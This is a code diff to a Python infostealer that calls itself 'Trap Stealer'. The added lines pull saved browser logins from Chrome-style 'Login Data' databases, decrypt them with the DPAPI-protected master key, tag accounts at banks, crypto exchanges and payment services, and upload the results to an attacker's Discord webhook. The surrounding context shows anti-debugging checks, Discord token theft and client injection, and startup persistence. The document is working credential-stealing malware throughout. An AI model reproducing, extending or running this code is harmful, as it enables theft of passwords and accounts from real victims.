@@ -20,11 +20,17 @@ from PIL import ImageGrab
 import string, platform
 from shutil import copy
 from os.path import isfile, join
-import winreg
+import winreg, random
+from sqlite3 import connect as sql_connect
+import sqlite3
+import win32crypt
+import requests
+from base64 import b64decode
+from Crypto.Cipher import AES
+from json import loads as json_loads
+import os, os.path, zipfile
+import shutil
 
-
-import os, os.path, zipfile, requests
-from config import hook
 ### CONFIG ### 
 webhook = '' #Put ur webhook
 
@@ -33,6 +39,8 @@ Startup = True # If True it will add the file into the startup folder
 shitty_message = True # If True it will print fake message, if you want to disable it replace with False
 antidebugging = True # If set to false it will dont check for VM or Debugger
 StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
+
+
 
 def antidebug():
     checks = [check_windows, check_ip, check_registry, check_dll]
@@ -181,6 +189,7 @@ def inj_discord():
                             f.write(inj_content)
 
 inj_discord()
+
 
 def globalInfo():
     ip = getip()
@@ -453,6 +462,8 @@ def uploadToken(token, path):
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 
+
+
 Tokens = ''
 def getToken(path, arg):
     if not os.path.exists(path): return
@@ -525,7 +536,10 @@ def GetAll():
     for patt in discordPaths: 
         a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
         a.start()
-
+    for patt in browserPaths: 
+        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
+        a.start()
+        Threadlist.append(a)
 try:
     GetAll()
 except:
@@ -556,7 +570,82 @@ headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
+
 LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
+keyword = [
+    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
+]
+pathing = 'none'
+def writeforfile(data, name):
+    global path
+    path = os.getenv("TEMP") + f"\\wp{name}.txt"
+    with open(path, mode='w', encoding='utf-8') as f:
+        f.write(f"Trap Stealer Password Stealer 🔑\n\n")
+        for line in data:
+            if line[0] != '':
+                f.write(f"{line}\n")
+                print(name)
+    
+
+
+path = os.getenv("TEMP") + f"\\wppassw.txt"
+CookiCount, PasswCount = 0, 0
+paswWords = []
+
+Passw = []
+def getPassw(path, arg):
+    global Passw, PasswCount
+    if not os.path.exists(path): return
+
+    pathC = path + arg + "/Login Data"
+    if os.stat(pathC).st_size == 0: return
+
+    tempfold = temp + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+
+    shutil.copy2(pathC, tempfold)
+    conn = sql_connect(tempfold)
+    cursor = conn.cursor()
+    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
+    data = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    os.remove(tempfold)
+
+    pathKey = path + "/Local State"
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
+
+    for row in data: 
+        if row[0] != '':
+            for wa in keyword:
+                old = wa
+                if "https" in wa:
+                    tmp = wa
+                    wa = tmp.split('[')[1].split(']')[0]
+                if wa in row[0]:
+                    if not old in paswWords: paswWords.append(old)
+            Passw.append(f"URL: {row[0]} | Username: {row[1]} | Password: {DecryptValue(row[2], master_key)}")
+            PasswCount += 1
+    writeforfile(Passw, 'passw')
+
+def passw():
+    file = {"file": open(path, "rb")}
+
+    data = {
+            "username": "Trap Stealer",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
+        }
+    response = requests.post(webhook, files=file, data=data)
+    try:
+        os.remove(path)
+    except:
+        pass
+try:
+    passw()
+except:
+    pass
 
 
 keywords = ["password", "mot_de_passe", "mdp", "motdepasse", "token", "key", "secret", "secrett", "api", "account", "login", "username", "email", "phone", "credit card", "social security number", "address", "birthdate", "security question", "PIN", "passport", "driver's license", "national ID", "bank account", "routing number", "financial information", "transaction", "balance", "wire transfer", "cryptocurrency", "bitcoin", "ethereum", "wallet", "private key", "public key"]
